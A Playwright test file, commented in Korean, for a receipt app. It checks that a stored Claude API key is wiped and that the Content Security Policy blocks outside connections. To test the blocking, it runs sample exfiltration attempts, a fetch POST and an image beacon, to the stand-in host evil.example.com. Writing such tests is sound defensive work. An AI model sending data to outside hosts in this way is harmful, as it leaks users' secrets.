// 보안: 휴대폰에 API 키를 두지 않음, 보안 정책(CSP)으로 다른 서버 연결 차단
import { test, expect } from '@playwright/test';
import { openApp, sheet } from './helpers.js';

const REAL_LOOKING = 'sk-ant-api03-ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-a1b2';

test('예전에 이 기기에 저장했던 Claude API 키는 지우고, 설정에도 키 입력 칸이 없다', async ({ page }) => {
  await openApp(page, { settings: { apiKey: REAL_LOOKING, model: 'claude-opus-5-5' } });
  expect(await page.evaluate(() => JSON.parse(localStorage.getItem('maeip.settings.v1')).apiKey)).toBe('');
  await page.locator('[data-act=settings]').click();
  await expect(sheet(page).locator('[name=apiKey]')).toHaveCount(0);
  await expect(sheet(page)).toContainText('영수증 자동 인식');
  expect(await page.content()).not.toContain(REAL_LOOKING);
});

test('보안 정책(CSP): 우리 서버·로그인 서버 외 다른 서버로는 데이터를 보낼 수 없다', async ({ page }) => {
  await openApp(page);
  const csp = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
  expect(csp).toContain("connect-src 'self' https://azcpuihnuumfdcoouyew.supabase.co");
  expect(csp).not.toContain('anthropic'); // 휴대폰은 Anthropic 에 직접 연결하지 않음 (서버를 거침)
  expect(csp).toContain("script-src 'self'");
  const result = await page.evaluate(async () => {
    try {
      await fetch('https://evil.example.com/steal', { method: 'POST', body: 'key' });
      return 'sent';
    } catch {
      return 'blocked';
    }
  });
  expect(result).toBe('blocked');
  // 이미지로 몰래 보내기도 차단
  const img = await page.evaluate(
    () =>
      new Promise((resolve) => {
        const i = new Image();
        i.onload = () => resolve('loaded');
        i.onerror = () => resolve('blocked');
        i.src = 'https://evil.example.com/p.gif?k=1';
      }),
  );
  expect(img).toBe('blocked');
});
